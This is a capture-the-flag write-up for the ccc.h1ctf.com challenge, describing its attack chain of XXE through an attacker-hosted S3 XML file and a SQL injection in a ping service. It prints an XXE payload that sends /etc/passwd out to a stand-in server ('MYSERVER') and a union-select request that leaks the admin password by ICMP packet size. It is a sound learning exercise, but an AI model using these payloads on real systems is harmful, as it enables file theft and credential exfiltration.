      "content": "We are given this website \n\n\thttps://ccc.h1ctf.com/\n\nWe can register a user which is assigned a user hash. In our case we got `8y399q` as user hash. Once logged in the page `/u/8y399q` just says:\n\n\n\t: Remote File list not found\n\n\nThe website points to a twitter account `https://twitter.com/DesignsCcc`. There we find a picture with a browser opened on the website we are attacking. One tab of the browser seems to point to: `/error_-_-_log.txt`\n\nWe are able to confirm that this file exists and it contains\n\n\tFile: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-y0c9ov.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-56qw4c.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\nOne of the buckets is intersting becaus it contains an hint towards XXE:\n\n```\nhttps://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml\n\n<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://patopirata.com/x\"> %ext;\n]>\n<r></r>\n```\n\nAfter a long struggle on many dead ends, and a couple of rickrollings we started wondering how can we make the site read a remote list of files. \n\nAt this point the key observation is that the log file above seems to suggest that the site will query a files.xml on AWS S3 with a predictable name:\n\n\th1-MYHASH.s3.eu-west-2.amazonaws.com/files.xml\n\n\nSo we went to AWS console and put an evil xml file in a public s3 bucket\n\n\n```\n    <?xml version=\"1.0\" ?>\n    <!DOCTYPE r [\n    <!ELEMENT r ANY >\n    <!ENTITY % sp SYSTEM \"http://MYSERVER:8080/ev.xml\">\n    %sp;\n    %param1;\n    ]>\n   <r>&exfil;</r>\n```\n\nWe were able to confirm the XXE vulnerability and after a lot of trial and error, working with the external DTD (in order not to change the xml on S3) we came up with this payload in the external dtd `ev.xml`:\n\n\n```xml\n<!ENTITY % data SYSTEM \"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % param \"<!ENTITY &#37; exfil SYSTEM 'ftp://MYSERVER:2121/%data;'>\">\n%param;\n%exfil;\n```\n\nFor exfiltration we are using the excellent tool `https://github.com/staaldraad/xxeserv`\n\n\nHaving php  (knowing the author of this challenge we suspected that), is very useful: we can work with filters to compress and encode data in order to easily exfiltrate even \"big\" files. \n\nIn particular we started looking at /etc/nginx/nginx.conf (mentioned by the twitter account of the developers) which contains usual include directives:\n\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\ninclude /etc/nginx/modules-enabled/*.conf;\n\n...\n\tinclude /etc/nginx/conf.d/*.conf;\n\tinclude /etc/nginx/sites-enabled/*;\n}\n```\n\nThe default virtual host config `/etc/nginx/sites-enabled/default` is all commented out, so it's not the running configuration, but it contains an important clue:\n\n```\n#server {\n#    server_name ccc.h1ctf.com;\n#    root /var/www/app/public;\n#    index index.php;\n#    location / {\n#            try_files $uri $uri/ /index.php?$query_string;\n#    }\n#     location /2b5d2b11513d2c9b {\n#       proxy_pass http://127.0.0.1:8888;\n#     }\n#\n```\n\nMoving on to `ccc.h1ctf.com/2b5d2b11513d2c9b` we do some recon in there and find a `.git/HEAD` file. We cannot find much else in the .git directory apart from the configuration .git/config\n\n```\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/ccc-labs/pinger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nWe now have the source code of the pinger service where we understand that we have to look at\n\n\thttps://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=XXX\n\nKey point is in the Ping model source code:\n\n`https://github.com/ccc-labs/pinger/blob/main/_pingercode_/models/Ping.php#L10`\n\n\n```\nclass Ping\n{\n\n    public static function send( $id ){\n        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';\n        $d = Db::connect()->prepare($sql);\n        $d->execute();\n        //Confirm we've found a matching row in the database\n        if( $d->rowCount() == 1 ){\n            $host = $d->fetch();\n            $ip = $host[\"ip\"];\n            $packet_size = intval($host[\"packet_size\"]);\n            //make sure PING packet size between 1 and 65527\n            if( $packet_size > 0 && $packet_size < 65528 ) {\n                //check IP is a valid IPv4 Address\n                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {\n                    //SEND 4 PING PACKETS IN THE BACKGROUND\n                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');\n                }\n            }\n        }\n    }\n\n}\n```\n\n\nThe service is clarly vulnerable to SQL injection, but given the validation applied to `$packet_size` and `$ip` we are not able to do nothing but actually ping something. \n\n*But* we have some room in `$packet_size` to put ascii codes of relevant characters. So in the end a request like the one below will exifltrate Nth character of the admin password:\n\n```\nGET /2b5d2b11513d2c9b/api/ping?\nid=-1+union+all+select+1,'MYSERVER',ascii(substr(password,N,1))+from+user+where+username='admin'%23 HTTP/1.1\n```\n\nIn particular it will generate ICMP packets towards my server\n\n```\n10:17:39.290067 eth0  In  IP 18.216.97.43 > x.y.z.w: ICMP echo request, id 223, seq 1, length 93\n```\n\nHere length 93 minus 8 for overhead will give ASCII 85 which is `U`, first character of the admin password. Repeating the exercise many times, sleeping one minute between request or, in my case, using a server with many different ip address will give the admin password `Ud79^1HHJ$W*IObaKdQgI`.\n\nLogging in the admin dashboard of pinger we get the flag:\n\n````\n████\n```",
